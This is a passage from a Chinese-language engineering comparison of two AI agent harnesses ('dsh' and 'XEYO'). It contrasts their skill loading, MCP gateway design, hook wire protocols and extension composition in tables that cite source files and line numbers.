| 目录/格式 | `.xeyo/skills/<name>/SKILL.md`（`extension/skill_loader.py`、`skill_store.py`）；本机实际只有 2 个：`awwwards-ui-design`、`map` | `SKILL.md` + YAML frontmatter（`name`/`description`），（`skill-filesystem/src/index.ts:672,725`） |
| 发现 | 单根目录 | **分层合并**：项目/用户/bundled 三源，`SkillRegistry` 分层覆盖（`skill/src/index.ts:358`） |
| 注入形态 | 经 T_now `skill_preinvoke` 块（用户 `/name` 直呼）+ `Skill` 工具按需加载 | 包成 `<skill_content name=…><skill_instructions>…</skill_instructions></skill_content>`（`skill/src/index.ts:172-185`）；用户直呼走 `skill-invocation` context 消息（`:148-161`） |
| 自带技能 | 2 个（用户级 `~/.workbuddy/skills` 另有） | **11 个**（`.agents/skills/`：`dsh-code-review`、`dsh-doc`、`dsh-prose-standard`、`dsh-ci-test-reliability`、`dsh-trim-cot-leakage`、`record-browser-gif` 等） |

---


> 来源：**R2 设计面·设计级对比** · 原节「19. Skill 系统」（源 L929–960）

##### 19. Skill 系统

###### 19.1 逐字段对照

| SKILL.md 字段 | dsh | XEYO |
|---|---|---|
| `name` / `description` | 必填（`skill-filesystem:810-815`） | 必填（`skill_loader.py:20-22, 50-59`） |
| 路由提示 | `whenToUse` | `model_hint` / `tags` |
| 模型可调用 | `disable-model-invocation`（bool） | `model_invocable` |
| 用户可调用 | `user-invocable`（bool） | `user_invocable` |
| 额外元数据 | `metadata`（对象） | `paths` / `mcp_dependencies` |
| 旧字段兼容 | `modelInvocable`/`userInvocable` **显式拒绝**（`:993-995`） | — |
| 坏 frontmatter | 忽略该 skill（记日志） | **fail-closed 丢弃**为 broken-but-listed（`skill_loader.py:24-25, 178-214`） |

###### 19.2 发现与注入

| | dsh | XEYO |
|---|---|---|
| 发现分层 | 7 层带 rank：`project-dsh`(100) / `project-agents`(200) / `custom`(300) / `user-dsh`(400) / `user-agents`(500) / `bundled`(600) / `runtime`(250)（`skill-filesystem:36-40, 241-261`） | 三源：`workspace`(`.xeyo/skills`) > `home`(`~/.xeyo/skills`) > `plugin`（`skill_loader.py:271-277, 305-339`），casefold 去重，默认禁止覆盖，3s TTL 缓存 |
| 合并语义 | global+scope 链，最近层同名覆盖，层内按 rank（`skill/src/index.ts:553-567, 808-812`） | 优先级高者胜，默认禁止覆盖 |
| 目录注入 | `<system-reminder><available_skills>` 持久 `skill-catalog` 消息，经 `agent/pre-step` 瀑布**按 digest 幂等重发**（`tool-skill:213-251, 254-277`；digest 变化才重发 `:228, 361-377`） | 目录嵌进工具 schema，**会话起点快照，会话内不变**（`skill_tool.py:82-97, 178-180`，`CATALOG_MAX_CHARS=2400`） |
| 正文注入 | `<skill_content name=…><skill_instructions>…` （`skill/src/index.ts:172-185`） | `Skill` 工具按需加载 |
| 用户直呼 | `skill-invocation` 上下文消息（`:148-161`） | T_now `skill_preinvoke` 块 |
| 工具动作 | `skill`（可 describe） | `Skill`——仅 `action:'list'`，**无 describe**（`skill_tool.py:243-257`） |
| 内置技能 | **11 个**（`.agents/skills/`） | 本机 2 个 |

###### 19.3 设计分歧

dsh 的目录是**每步校验 digest 的活页**（变了就重发，幂等）；XEYO 的目录是**会话起点冻结的快照**。这与 §0.1 的整体取向完全一致：dsh 允许会话内变化并保证幂等；XEYO 冻结一切以保前缀稳定。**同一个设计哲学在两个不相关的子系统上重复出现**，说明它不是局部选择而是全局纪律。

---


> 来源：**R3 实现面·实现级对比** · 原节「18. Skill 系统：实现级」（源 L1706–1763）

##### 18. Skill 系统：实现级

###### 18.1 dsh：frontmatter 逐字段

**包结构**：`skill`（seam）+ `skill-filesystem`（本地 provider，§`ParsedSkill`）+ `skill-badge` + `tool-skill`。共 9 文件 / 6,162 行（`skill-filesystem` 是主体）。

**`ParsedSkill` 逐字段**（`skill-filesystem/src/index.ts:104-112`）：

```ts
interface ParsedSkill {
  name: string
  description: string
  whenToUse?: string
  invocation: SkillInvocationPolicy
  metadata?: Record<string, unknown>
  content: string
}
```

**SKILL.md 的实际格式**（实测内置 10 个技能，如 `.agents/skills/dsh-code-review/SKILL.md`）：YAML frontmatter 只有 `name` + `description`：

```yaml
---
name: dsh-code-review
description: Use when reviewing a pull request in the deepseek-harness repo — orients the reviewer to …
---
```

`whenToUse` 与 `metadata` 是**可选**字段（`ParsedSkill` 里带 `?`），`invocation` 是策略对象（决定技能如何被调用）。

**发现与加载实现**：
- 分区根：`Config` 有 `skipSystem?` / `projectRoot?` / `trustedHost?`（`:95-99`），发现时 `if (root.skipSystem && entry.name === '.system') continue`（`:723`），文件级只认 `entry.name.endsWith('.md')`（`:726`）；
- **条目按 `localeCompare` 排序**（`:722`）——确定的发现顺序；
- 条目解析 `parseFrontmatter(raw)`（`:801` / `:909`）→ 注册到 `ctx.skills`，带 `provider: this.name`（`:216`）；
- **监听配置**（`ResolvedWatchConfig`）：`enabled / usePolling / stabilityThresholdMs / pollIntervalMs / maxProjects / followSymlinks`——**技能目录是热监听的**（含稳定性阈值与轮询间隔，说明考虑过写文件的竞态）。

**注入方式**：工具面是 `skill` 工具；调用后**通过 `agent.inject()` 以 user/message 替换目录**（tool-catalog 原文：`user/message replacement catalogs via agent.inject()`）——即**技能正文以 user 消息注入**，不是系统提示。

###### 18.2 XEYO

- 目录：`.xeyo/skills/`；
- 暴露：`Skill` 工具（`tools/skill_tool/`）+ `skill_preinvoke` T_now 块（**用户 `/name` 直呼时的宿主确定性加载**，登记理由：「不注入则直呼依赖模型自觉调 Skill 工具，user 只见技能的直呼即失效」）；
- 开关：`enabled_extensions`（默认关）+ `set_skill_enabled` → push reconcile → T_now 的 `reconcile_events` 块（event 类，静默即永久丢失）；
- 契约测试：`tests/extension/*`。

###### 18.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| frontmatter 字段 | `name`（必）+ `description`（必）+ `whenToUse?` + `invocation`（策略）+ `metadata?` | 未见统一 frontmatter 契约（`.xeyo/skills` 目录） |
| 发现根 | 多根 + `skipSystem` / `projectRoot` / `trustedHost` | 单目录 |
| 热更新 | **有**（监听 + 稳定性阈值 + 轮询间隔 + maxProjects + symlink 策略） | 无监听（靠 reconcile 推送） |
| 注入形式 | `skill` 工具 → `agent.inject()` 替换 user 消息目录 | `Skill` 工具 + `/name` 直呼时 T_now `skill_preinvoke` |
| 目录校验 | **完整性 guard**（新 `packages/*/tool-*` 未文档化即失败） | 无 |
| 内置技能 | **10 个**（code-review / doc / translate-docs / pre-push-checks / ci-test-reliability / merging-stacked-prs / archive-agent-notes / find-simplifications / prose-standard / trim-cot-leakage） | `.xeyo/skills` 用户侧 |

---


## 域 22 · MCP 与扩展层

> 来源：**R1 功能面·全量对比** · 原节「16. MCP 与扩展层」（源 L357–371）

##### 16. MCP 与扩展层

| | XEYO | dsh |
|---|---|---|
| 配置 | `<root>/.xeyo/settings.json`（home + workspace 合并，**workspace 更具体者优先**；坏 JSON keep-last-good） | 插件即配置；MCP 由 `mcp-client` 单实例连单 server |
| 传输 | MCP client（`extension/mcp_client.py`） | `stdio`（command/args/env/cwd）或 `streamable-http`（url/headers）（`mcp-client/src/index.ts:50-98`） |
| 工具暴露 | `Mcp` **网关工具**：`action=list|describe|call|resources|read_resource`（`mcp_gateway.py`） | 直接注册进 `ctx.tools`，公共名 `mcp__<server>__<tool>`（`mcp-client/src/index.ts:3-5`） |
| tools 数组冻结 | **绝对红线**：`_schemas_cache` 会话内冻结、零前缀重缓存；会话内启停只发 T_now 活页块（`extension/reconcile.py:9-12`） | 同样冻结：attach 时快照决定哪些工具进 `schemas()`，会话内**永不触碰 `_schemas_cache`**（`AGENTS.md` 扩展层契约）；会话内新增工具的唯一通道是 `Mcp` 网关（**dsh 也有同名网关工具！**） |
| 权限 | 停用即 DENY，不可被 grant 穿越（`policy.py` 先于 grant 判定） | 走与原生工具相同的 `tools` 管线，无独立权限 |
| 其他扩展 | `plugins/`（manifest + hooks + 子进程执行） | 255 个包本身就是扩展；`ctx.dynamicCordisRunner` 运行期加载 |

> **意外的高度相似**：两边都独立演化出了「工具面会话内冻结 + 网关工具做会话内新增」的设计，连网关工具命名（`Mcp`）都一致。

---


> 来源：**R2 设计面·设计级对比** · 原节「20. MCP 集成」（源 L961–991）

##### 20. MCP 集成

###### 20.1 dsh：直注工具面，无网关

- 一个 `mcp-client` 插件实例连一个 server，工具**直接注册进 `ctx.tools`**，公共名 `mcp__<serverName>__<rawName>`（`mcp-client/src/index.ts:4-5`；`tools.ts:113`）；多 server 多实例（`:4-11`）。
- 传输：`stdio`（command/args/env/cwd）或 `streamable-http`（url/headers）（`:50-95`）。
- 命名空间预留 + 冲突处理（`:154-168`）；`apply` **阻塞激活**直到首连 + 工具发现完成（`:184-187`）；重连策略（`:106-134, 173, 175-177`）；`failOnStartupError`（`:70, 122, 185`）。
- 权限：走与原生工具相同的 `ctx.tools` 管线，**无独立权限模型**。

###### 20.2 XEYO：不出网关，走 `Mcp` 工具

- 配置三源合并（`settings.json` 的 `mcp_servers` + project mcp，按 id 合并，`mcp_manager.py:6, 113-131`）；`McpManager` 按 cwd 进程单例（`:5, 55-56, 89`）。
- 生命周期：stdio 子进程，skip-and-log，有界重连 500ms→30s 至多 10 次（`mcp_client.py:10-14`）；server 身份 = config sha256，attach 复用就绪 client（`:8-9`）；`required: true` 失败**不挡会话** + 挂 T_now 警告（`:10-11`，对应 `mcp_required_warn` 块）。
- **暴露方式**：经 `McpTool` 注册进 `ToolRegistry`，默认 `outbound_ask`（`:17-18`），不折叠同名（`:15-16`）；可见性预算 F2（`:77-85`）。授权：无 `${VAR}` 展开（`:14-15`）。
- **网关工具** `Mcp`：`action = list | describe | call | resources | read_resource`（`mcp_gateway.py:45-51`）。
- 作者对网关必要性的说明（`mcp_gateway.py:1-16`）：会话内新增工具的**唯一通道**（因为 tools 数组已冻结）；`reconcile.py:1-12` 补充「会话内启停**永不触碰**已冻结的 `schemas()`」。

###### 20.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 工具暴露 | 直注 `ctx.tools`，命名空间名 | 注册 + **`Mcp` 网关工具** |
| 会话内新增 | 直接生效（工具面不冻结） | 只能经网关（工具面冻结） |
| 启停传播 | 插件激活期注册 | push reconcile → 单轮 T_now 活页块 |
| 权限 | 同原生管线 | `outbound_ask` 默认 + 停用即 DENY 不可被 grant 穿越 |
| 启动失败 | `failOnStartupError` 可选 | required 失败不挡会话 + T_now 警告 |

**这是本轮更正的核心结论**（§0.1）：第一轮把 XEYO 的网关设计误当成两端的共同点。真实情况是——**网关是 XEYO 为了绕过自己的冻结而发明的东西，dsh 因为不冻结所以不需要它**。

---


> 来源：**R3 实现面·实现级对比** · 原节「19. MCP 集成：实现级」（源 L1764–1804）

##### 19. MCP 集成：实现级

###### 19.1 dsh：直注工具面，无网关

**包**：`packages/mcp/mcp-client/`（`index.ts` / `connection.ts` / `tools.ts` / `transport.ts`）——仅 12 文件 / 4,101 行。

**工具命名与命名空间保留**（`index.ts:4-10, 37-58`）：

```ts
/** Valid `serverName`, kept below the public tool-name budget. */
// 工具名形如 `mcp__<serverName>__<rawName>`
// serverName 必须匹配 [A-Za-z0-9_-]{1,32}
```

- **每个插件实例连接一个 MCP server**，并**保留 `serverName` 命名空间**；重复 serverName 会让**新实例**失败（`:152` 注释：「Reserve the namespace next: a duplicate `serverName` fails THIS instance」）；
- **HMR 热替换**：dispose 旧实例 → 建新实例（`:9-10`）；
- 有 `resolveReconnectPolicy(config.reconnect, …)` —— **重连策略是配置项**；
- 工具是**直注** `ctx.tools`（工具名在全局命名空间里），**没有网关工具、没有会话内启停**。因此**工具面变化 = 新 `request/header`**（tool-catalog 对 `cordis_*` 的说明也印证：「a full changed request header logs those tool-set changes」）。

###### 19.2 XEYO：网关工具 + push reconcile + 指纹 v2

第三轮无需重复第二轮结论，仅补实现级细节：

- **`Mcp` 网关工具的 action 集**：`list | describe | call | resources | read_resource`（第二轮核实 `mcp_gateway.py`）；策略层 `_evaluate_mcp_gateway`（`policy.py:1217-1318`，**102 行**）把 `list`/`describe` 视为元动作放行、`call` 解析目标身份后走目标工具策略；
- **指纹 v2 的落库链路**：`PolicyDecision.mcp_target`（`policy.py:64-66`）→ 挂起项 `PendingPermission.mcp_target`（`store.create` 参数）→ `grant_fingerprint(..., mcp_target=...)` → `mcp_grant_fingerprint(identity_name)`；
- **remove 即 DENY**：`permissions/policy.py` 在 grant 两分支**之前**判停用（第二轮的「不可被 grant 穿越」）；
- **tools 数组冻结**：`_schemas_cache` 会话内不复算；新增工具唯一通道 = 网关工具。

###### 19.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 工具暴露 | **直注** `ctx.tools`，名 `mcp__server__tool` | 不进 tools 数组，**只出 `Mcp` 网关工具** |
| serverName 约束 | 正则 `[A-Za-z0-9_-]{1,32}` + 命名空间保留（重复即失败） | 未见同形约束 |
| 会话内启停 | **不支持**（靠 HMR dispose/重建 + header change 记录） | **支持**（push reconcile + T_now 活页块） |
| 重连 | 有（`reconnect` 配置 + 策略解析） | 有（`mcp_client.py`） |
| 鉴权/权限 | 未见 MCP 专属权限模型（走工具通用路径） | **指纹 v2 + 停用即 DENY + 目标身份解析** |
| 命名空间冲突 | 显式失败 | 未见 |

---


## 域 23 · Hooks（含 wire 协议逐字段）

> 来源：**R1 功能面·全量对比** · 原节「17. Hooks」（源 L372–383）

##### 17. Hooks

| | XEYO | dsh |
|---|---|---|
| 事件 | `PreToolUse`、`PostToolUse`、`PermissionRequest`、`SessionStart`、`SessionEnd`（`extension/hooks.py:36`） | `SessionStart`、`UserPromptSubmit`、`PreToolUse`、`PostToolUse`、`Stop`、`SubagentStop`（+`SubagentStart` 注入子上下文）（`hooks-claude-code/src/index.ts:207,222,240,249,271,294`） |
| 方言 | 自有 JSON（`XEYO_HOOK_CONTEXT`） | **双方言**：`HookDialect='claude-code'|'codex'`（`hook-protocol/src/types.ts:48,79`） |
| 决策 | 三分：Success / FailedContinue / FailedAbort；`PermissionRequest` 非 Success → **fail-closed DENY** | `allow/ask/deny/none` → 归一 `allow/deny/block`（`merge.ts:12`） |
| 执行 | 子进程，短超时（默认 600s），剥离 `GIT_*`，结果 stdout 作为 T_now 上下文块注入 | 经 `ctx.shell` 写 JSON payload 到 stdin；结果记 `hook/invoked`+`hook/result` 事件（`events.ts:75,92,99`） |
| 默认 | **关**（`hooks_enabled` 默认关，`extension/hooks.py` 文档头） | 由组合决定 |

---


> 来源：**R2 设计面·设计级对比** · 原节「21. Hooks」（源 L992–1010）

##### 21. Hooks

| 维度 | dsh | XEYO |
|---|---|---|
| 事件 | `SessionStart` / `UserPromptSubmit` / `PreToolUse` / `PostToolUse` / `Stop` / `SubagentStop` / `SubagentStart`（`hooks-claude-code/src/index.ts:2-8, 207-294`） | `PreToolUse` / `PostToolUse` / `PermissionRequest` / `SessionStart` / `SessionEnd`（`extension/hooks.py:38`） |
| 方言 | **双方言** `HookDialect = 'claude-code' \| 'codex'`（`hook-protocol/src/types.ts:48`） | 自有 JSON |
| 配置 | `hooks.json`（`configPath`，`:45-53, 104`） | 插件 manifest 的 `hooks`（`hooks.py:82-96`） |
| wire | 经 `ctx.shell` 跑命令，JSON 写 stdin | 子进程，注入 `XEYO_HOOK_CONTEXT`，剥离 `GIT_*`（`:16, 123-124`） |
| 决策归一 | `allow / ask / deny / none`，优先序 **deny > ask > allow**，首个 `continue:false` **粘滞**（`merge.ts:3-21, 79-82`） | 三分 `Success` / `FailedContinue` / `FailedAbort`，超时 → FailedAbort（`:9-11, 111-113`） |
| 能否阻断 | 能（`abort`） | 能（`abort`，`:182-185`）；`PermissionRequest` 非 Success → **fail-closed DENY**（`:11`） |
| stdout 用途 | — | 经 reconcile 注入 T_now 块（`:13-14, 162, 179-181`） |
| 超时默认 | 600000ms（`:66-67`） | 600s（`:41`） |
| 日志 | `hook/invoked` + `hook/result` 事件（`events.ts:75, 92, 99`） | 审计 |
| 默认 | 由组合决定 | **关**（`hooks_enabled` 默认 false，`config.py:183-185`） |

**设计差异**：dsh 把 Hooks 当成**外部生态兼容层**（同时吃 Claude Code 与 Codex 的 hooks 协议），XEYO 把它当成**自有扩展点**且默认关闭。前者是"接入别人"，后者是"给别人接我"。

---


> 来源：**R3 实现面·实现级对比** · 原节「20. Hooks：实现级」（源 L1805–1868）

##### 20. Hooks：实现级

###### 20.1 dsh：双桥 + 封闭 codec + 事件成对

**包**：`hooks/hook-protocol`（`codec.ts` / `detached.ts` / `events.ts` / `matcher.ts` / `merge.ts` / `runner.ts` / `types.ts` / `invariant.ts`）+ `hooks-claude-code` + `hooks-codex`。33 文件 / 4,873 行。

**事件全集（实测）**：`SessionStart` / `UserPromptSubmit` / `PreToolUse` / `PostToolUse` / `Stop` / `SubagentStart` / `SubagentStop`（`hooks-claude-code/src/index.ts` 的 runPoint 调用点覆盖）。**matcher 语义有例外**：`UserPromptSubmit` 与 `Stop` 的 matcher 字段被丢弃（`matcher.ts:68` 注释：「because those events have no …」）。

**codec 的优先级规则（实现级，容易搞错的一处）**（`codec.ts:33-130`）：

| 通道 | 合法取值 | 说明 |
|---|---|---|
| 顶层 `decision` | **只有 `approve` / `block`** | `allow`/`deny`/`ask` 写在这里**是无效的、被忽略**（注释：「So an out-of-band `{"decision":"deny"}` is invalid and ignored here (it must not become a real blocking decision)」） |
| `hookSpecificOutput.permissionDecision` | **只有 `allow` / `deny` / `ask`** | **覆盖**顶层 legacy decision（`:125-126`） |
| `hookSpecificOutput.hookEventName` | 必须匹配当前触发事件 | 缺失或不匹配 → **丢弃该 hookSpecificOutput 的 per-event 部分** |
| `additionalContext` | string | 与 `updatedInput` 一起住在 hookSpecificOutput 里 |
| `continue` | bool | 顶层 |

**stderr 摘要上限**（`events.ts:52-54`）：`DEFAULT_STDERR_SUMMARY_MAX_CHARS = 500`，注释说明「它住在截断规则旁边，一次定义，**两个桥不能各写一份漂移**」；截断规则是「trim 后空 → `undefined`；超限按 `maxChars` 切断并加省略号」。

**审计事件成对且必须 turn 内**（`events.ts:1-8`）：

> They carry no surface intent and must remain **turn-enclosed and invoked/result paired**. Mid-turn hook points satisfy that boundary; **SessionStart records injected context instead and does not append `hook/*` outside a turn.**

`HookInvocation` 字段：`turn`, `point`, `dialect`, `handlerId`, `matcher?`；`HookResultRecord` 再加 `output`, `stderrSummaryMaxChars`, `durationMs`（durable 计时）。

**各事件的行为**（`hooks-claude-code/src/index.ts`）：
- `SessionStart`：**detached** 运行（`detached.track(...)`），慢 hook 不阻塞；失败只 `logger.warn`；
- `UserPromptSubmit` → `PreStepDecision`（可改进入 step 的消息）；
- `PreToolUse` → `PreToolDecision`，`deny` 时 `{ kind:'deny', reason: merged.reason ?? 'blocked by PreToolUse hook' }`；
- `PostToolUse` → `PostToolDecision`，`block` 时注入 feedback 文本 + 可选 `additionalContexts`；
- `Stop` → **block 强制续跑**（`:271-274`，reason 默认 `'continue: blocked by Stop hook'`）；
- `SubagentStart` 可注入子上下文；`SubagentStop` **只观察**。

###### 20.2 XEYO

第二轮已给设计面，此处补实现级事实：

- **事件全集**：`EVENTS = ("PreToolUse", "PostToolUse", "PermissionRequest", "SessionStart", "SessionEnd")`（`extension/hooks.py:38`）——**比 dsh 少 `UserPromptSubmit` / `Stop` / `SubagentStart` / `SubagentStop`，多 `PermissionRequest` / `SessionEnd`**；
- **超时默认 600s**（`_DEFAULT_TIMEOUT_S = 600.0`，`:41`）；
- **三分结果**（`_outcome_for` `:109-116`）：`timeout` → **`abort`**（fail-closed）；`returncode == 0` → `success`；非零 → `abort` if `fail_policy=="abort"` else `continue`；**OSError → `error`**；
- **PermissionRequest 任一非 Success → fail-closed DENY**（模块 docstring `:11`）；
- **执行环境**：`env = scrub_git_env()`（剥离仓库级 `GIT_*`，复用 `plugin_fetcher.scrub_git_env`）+ 注入 `XEYO_HOOK_CONTEXT`（JSON）；`cwd = hook.command.parent`；`command` 相对插件根且**已校验禁越界**（`_resolve_command` `:100-106` 用 `relative_to` 校验）；
- **afdout 注入**：`stdout` 非空且 status ≠ abort 时 `_format_block(...)` → `publish_reconcile_block(blk)`（**走 T_now 管线**）；**正文截断 800 字符**（`:199`）；
- **默认关**：`ExtensionConfig.hooks_enabled()` = 扩展主开关 && hooks 主开关（默认 false）；关闭时「本模块零执行、零注入（旁路形态，逐位 = 停产）」（docstring `:6-7`）；
- **async 接缝**：`run_event_hooks_async` 用 `asyncio.to_thread` 包装（`:210-217`），避免阻塞事件循环。

###### 20.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 事件数 | 7（SessionStart / UserPromptSubmit / PreToolUse / PostToolUse / Stop / SubagentStart / SubagentStop） | 5（PreToolUse / PostToolUse / **PermissionRequest** / SessionStart / **SessionEnd**） |
| 协议 | **双桥**（Claude Code + Codex），各有独立 wire 形态 | 自有协议（`XEYO_HOOK_CONTEXT` 环境变量 + stdout） |
| 决策通道 | 顶层 `decision`(approve/block) + `hookSpecificOutput.permissionDecision`(allow/deny/ask)，后者覆盖前者 | 三分结果（success/continue/abort），无「ask」通道 |
| 阻断能力 | 能（PreToolUse deny / PostToolUse block / Stop 强制续跑） | 能（abort；PermissionRequest 非 Success → DENY） |
| matcher | 有（按工具名；两类事件无 matcher） | 未见（无 matcher 概念） |
| 审计 | `hook/invoked` + `hook/result` 成对，**turn 内强制**，带 durationMs | 审计日志，无成对与 turn 包络约束 |
| stderr 上限 | 500 字符（常量集中定义，防两桥漂移） | stdout 截断 800 字符；stderr 只记错误 |
| 超时 | runner 的 `defaultTimeoutMs`（每桥自持配置默认） | 600s（常量） |
| 默认开关 | 由组合决定 | **默认关**（扩展主开关 && hooks 开关） |
| stdout 去向 | 未见过滤后注入模型上下文 | 经 reconcile 注入 T_now 块（`# 插件钩子·<事件>（background only …）`） |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§11 Hooks：wire 协议逐字段」（源 L1016–1091）

##### §11 Hooks：wire 协议逐字段

###### 11.1 dsh 共用 wire 类型（`hooks/hook-protocol/src/types.ts`）

**`HookOutput` 14 字段**

| # | 字段 | 类型 | 语义（原文要点） |
|---|---|---|---|
| 1 | `exitCode` | `number \| undefined` | 原始退出码；`undefined` = 钩子没跑起来 |
| 2 | `stderr` | `string` | trim 后；**退出 2 时是 block 原因来源** |
| 3 | `stdout` | `string` | trim 后原样保留（干净退出时可为纯文本，CC 渲染为输出，Codex 视作 `additionalContext`） |
| 4 | `continue?` | `boolean` | `false` → 请求停止；配 `stopReason` |
| 5 | `stopReason?` | `string` | 停顿时显示的原因 |
| 6 | `decision?` | `'approve' \| 'allow' \| 'block' \| 'deny' \| 'ask'` | **归一化后的中性阻断决策** |
| 7 | `reason?` | `string` | 随 `decision` 的原因 |
| 8 | `hookEventName?` | `string` | 事件判别式；不匹配则丢弃事件域字段（保留该值） |
| 9 | `additionalContext?` | `string` | 给下次模型请求的额外上下文 |
| 10 | `systemMessage?` | `string` | 展示给用户的警告 |
| 11 | `updatedInput?` | `Record<string, unknown>` | **解析但不采纳**（输入改写已推迟；桥会记日志+告警） |

**关键归一化规则（原文，务必逐字）**

> The neutral blocking decision a hook expressed, folded from the two channels the reference protocols keep **DISTINCT**: the legacy top-level `decision` (`approve`/`block` **only**) and `hookSpecificOutput.permissionDecision` (`allow`/`deny`/`ask`). We normalize them to one enum — `'block'`/`'deny'` forbid, `'approve'`/`'allow'` permit, `'ask'` requests confirmation — but **`'allow'`/`'deny'`/`'ask'` arise ONLY from a `permissionDecision`, never from a top-level `decision`** (an out-of-band `{"decision":"deny"}` is **invalid and ignored**, matching the schemas). Absent ⇒ no explicit decision (exit code governs).

**`CommandHook`**：`{command: string, timeoutSec?: number}`（**wire 单位是秒**，runner 转 ms）。
**`MatcherGroup`**：`{matcher?: string, hooks: CommandHook[]}`；`matcher` 缺席 / `''` / `'*'` = match-all。
**`MatcherMode`**：CC 在模式纯 `[A-Za-z0-9_|]+` 时用**字面量**（竖线=精确择一），否则正则；Codex **恒正则**。
**`DEFAULT_STDERR_SUMMARY_MAX_CHARS = 500`**（两桥共用的唯一默认，放在协议层防漂移）。

**hook 事件（log-only 两条）**

| 事件 | payload 逐字段 |
|---|---|
| `hook/invoked` | `turn`, `point: string`, `dialect: HookDialect`, `matcher?: string`, `handlerId: string` |
| `hook/result` | `turn`, `point`, `handlerId`, `decision: string`, `exitCode?: number`, `stderrSummary?: string`, `durationMs: number` |

###### 11.2 三个 hook 点集逐条对照

| 方言 | 支持点 | 数量 | 换算 |
|---|---|---|---|
| **Claude Code** | `SessionStart`, `UserPromptSubmit`, `PreToolUse`, `PostToolUse`, `Stop`, `SubagentStart`, `SubagentStop` | **7** | ✅ 完整 |
| **Codex** | `PreToolUse`, `PostToolUse`, `SessionStart`, `UserPromptSubmit`, `Stop` | **5** | 少 `SubagentStart/Stop` |
| **XEYO** | `PreToolUse`, `PostToolUse`, `PermissionRequest`, `SessionStart`, `SessionEnd` | **5** | 独有的 `PermissionRequest`；缺 `UserPromptSubmit`/`Stop`/`Subagent*` |

**能力差异**：Codex 只认 **block**（deny），不认 `allow`/`ask`；CC 认三种；XEYO 三分结果为 `Success` / `FailedContinue` / `FailedAbort`，**`PermissionRequest` 任一非 Success → fail-closed DENY**。

###### 11.3 XEYO hooks 逐字段

| 项 | 值 | 位置 |
|---|---|---|
| 事件元组 | `EVENTS = ("PreToolUse", "PostToolUse", "PermissionRequest", "SessionStart", "SessionEnd")` | `extension/hooks.py:41` |
| 默认超时 | `_DEFAULT_TIMEOUT_S = 600.0`（**秒**） | `:44` |
| 结果三态 | `success` / `continue` / `abort` / `skipped` | `HookOutcome:62` |
| `PluginHook` 字段 | `plugin_name`, `event`, `command: Path`, `args: tuple`, `timeout_s=600.0`, `fail_policy="continue"` | `:49-58` |
| 开关 | `hooks_enabled(cwd)` = 扩展层主开关 **&&** hooks 主开关，**默认关** | `:70` |
| 子进程环境 | 剥离仓库级 `GIT_*`（复用 `plugin_fetcher.scrub_git_env`）+ 注入 `XEYO_HOOK_CONTEXT`（JSON） | 文件头 docstring |
| 注入通道 | 钩子 stdout 经 `extension.reconcile.publish_reconcile_block` 走 **T_now 管线**；注释："事件类静默即失，**绝不门控**" | 文件头 docstring |
| 预留 | 注释声明 `Subagent*` / `UserPromptSubmit` / `PrePostCompact` 为**预留** | 文件头 docstring |

###### 11.4 Hooks 差异矩阵

| 维度 | dsh | XEYO |
|---|---|---|
| 点集大小 | 7（CC）/ 5（Codex） | 5 |
| 方言兼容 | ✅ 双桥（CC + Codex），各自 wire 差异显式建模 | ❌ 自有协议 |
| 输出解析 | `HookOutput` 14 字段 + 两通道归一化 + 事件名不匹配丢字段 | `HookOutcome{status, blocks, errors}` |
| 阻断 | ✅ `decision` 归一化 5 值；Codex 只认 deny | ✅ `abort`（且 PermissionRequest fail-closed） |
| 超时 | per-hook `timeoutSec`（秒）→ ms | per-hook `timeout_s`（**默认 600**） |
| stderr 摘要上限 | **500** 字符（协议层唯一默认） | — |
| 输入改写 | 解析但**不采纳**（显式推迟） | — |
| 默认开关 | 由组合决定 | **关**（`hooks_enabled` 默认 false） |
| 审计 | `hook/invoked` + `hook/result` 两条事件（进 session log） | 审计文件 |
| 结果去向 | 事件 + `additionalContexts` | stdout → T_now 块 |

---


## 域 24 · 扩展组合机制

> 来源：**R2 设计面·设计级对比** · 原节「22. 扩展组合机制」（源 L1011–1048）

##### 22. 扩展组合机制

###### 22.1 dsh：四层组合

```
Profile（5 档：web / headless / sdk / sdk-minimal / acp）   boot/app-boot/src/profile.ts:137-158
  → Bundle（@deepseek-ai/dsh-base + 各 app bundle）          :142-157
  → 用户 cordis.patch.yml                                    :7-13, 44
  → --patch 覆盖层
Preset（agent-presets：standard / minimal / ptc / cordis）   以 scope 子树挂到 agent 之下
                                                             preset/agent-presets/src/mount.ts:1-14
```

- **改行为的两条路径**：① 在 `cordis.patch.yml` 加/改插件行（部署期）；② 会话内 `cordis_define`（运行期，模型自己挂）。
- **改提示**：patch `systemPrompt` section 或 agent preset 的 system 段。
- **扩展点规模**：`docs/capability-seams.md` 实测 70 行 / **69 个唯一 `ctx.<name>`**；包总数 **255**。

###### 22.2 XEYO：固定枚举 + 配置开关

- `settings.json`（home + workspace 合并）+ `enabled_extensions` 总开关 + `plugins` / `skills` / `mcp_servers` / `hooks` 子开关（`extension/config.py:130-198`）。
- 扩展面**固定三条**：`extension/`（MCP + 插件 + hooks）、`slash/`、`skills/`。`AGENTS.md` 反巨石规则明确：新逻辑进新模块，**不在 `extension/` 之外新开扩展面**。
- 改行为：加 `mcp_servers` 条目、装插件、写 skill。**无运行期挂载。**

###### 22.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 扩展点数量 | 69 seam / 255 包 | 3 个面 / 4 类开关 |
| 替换粒度 | 单 seam 的 provider（改配置） | 整包替换（改代码） |
| 运行期挂载 | 支持（`cordis_define`） | 不支持 |
| 配置载体 | `cordis.yml` + `cordis.patch.yml`（YAML + `!!js`） | `settings.json`（纯 JSON） |
| 失败姿态 | fail-loud（配置错误直接炸） | keep-last-good（坏 JSON 保留上一份） |
| 守卫 | `verify-cordis-config` 等 40+ verify | 启动自检硬失败 + 契约测试 |

**这是"可替换性"与"可预测性"的取舍**：dsh 换来的是"任何一块都能换"，代价是"没有任何一块的行为是确定的"；XEYO 换来的是"引擎行为完全可预期"，代价是"改任何行为都要发版"。

---


> 来源：**R3 实现面·实现级对比** · 原节「21. 扩展组合机制：实现级」（源 L1869–1916）

##### 21. 扩展组合机制：实现级

###### 21.1 dsh：Profile 是一个目录，组合是一条 patch 链

**实现**（`packages/boot/app-boot/src/profile.ts:3-23`）：

> A profile is a directory under `$DSH_HOME/profiles/<name>` holding:
